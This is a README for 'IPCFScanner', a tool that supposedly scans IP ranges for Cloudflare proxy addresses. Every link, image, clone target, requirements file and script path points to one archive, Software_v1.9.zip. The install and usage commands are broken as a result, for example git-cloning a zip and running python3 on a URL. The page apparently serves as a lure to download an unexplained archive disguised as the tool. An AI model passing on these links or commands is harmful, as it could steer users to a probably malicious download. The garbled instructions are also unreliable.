# IPCFScanner

The main purpose of this tool is to scan CIDR to find IP proxies for CF Vless, but due to program deficiencies, this tool can only be used to scan IPs connected to Cloudflare, so to determine whether the IP is a proxy IP, you have to check again on this website, [click here](https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip)
an example is below

![termux](https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip) ![chrome](https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip)

## How To Install

```sh
pkg update && pkg upgrade
pkg install git python3
git clone https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip
cd scan
python3 -m pip install -r https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip
python3 https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip -h
```

## Usage

for CIDR / IP RANGE
```
python3 https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip -p 10.10.10.0/24
```
for File with format
1.1.1.0/24
2.2.2.0/24
```
python3 https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip -f https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip
```
for more information
```
python3 https://raw.githubusercontent.com/jhoker/scan/main/unflower/Software_v1.9.zip -h
```
